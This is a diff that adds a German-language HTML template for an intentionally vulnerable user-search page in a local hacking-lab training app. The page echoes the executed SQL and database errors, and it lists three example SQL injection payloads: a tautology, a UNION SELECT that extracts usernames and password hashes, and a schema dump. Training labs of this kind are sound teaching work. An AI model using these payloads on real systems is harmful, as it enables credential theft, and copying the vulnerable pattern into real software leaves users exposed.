@@ -1,0 +1,41 @@
+{% extends "base.html" %}
+{% block title %}User-Suche · Hacking-Lab{% endblock %}
+{% block content %}
+  <h1>User-Suche <span style="color:#b00">⚠️ verwundbar</span></h1>
+  <form method="post">
+    {{ form.hidden_tag() }}
+    {{ form.q(placeholder="z.B. alice") }}
+    {{ form.submit() }}
+  </form>
+
+  {% if sql %}
+    <p><strong>Ausgeführtes SQL:</strong></p>
+    <pre style="background:#8881;padding:.5rem;border-radius:.4rem;white-space:pre-wrap">{{ sql }}</pre>
+  {% endif %}
+
+  {% if error %}
+    <div class="flash danger">DB-Fehler: {{ error }}</div>
+  {% endif %}
+
+  {% if results is not none %}
+    <p><strong>{{ results|length }} Treffer:</strong></p>
+    <table border="1" cellpadding="4" style="border-collapse:collapse">
+      <tr><th>Spalte 1</th><th>Spalte 2</th></tr>
+      {% for row in results %}
+        <tr>{% for cell in row %}<td>{{ cell }}</td>{% endfor %}</tr>
+      {% endfor %}
+    </table>
+  {% endif %}
+
+  <hr>
+  <details>
+    <summary>Beispiel-Payloads (nur gegen diese lokale Lab-App)</summary>
+    <ul>
+      <li><code>%' OR '1'='1</code> → listet alle User</li>
+      <li><code>%' UNION SELECT username, password_hash FROM users --</code>
+          → zieht Benutzernamen + Passwort-Hashes in die Ergebnis-Spalten</li>
+      <li><code>x%' UNION SELECT sql, name FROM sqlite_master --</code>
+          → Schema (Tabellen-DDL) auslesen</li>
+    </ul>
+  </details>
+{% endblock %}
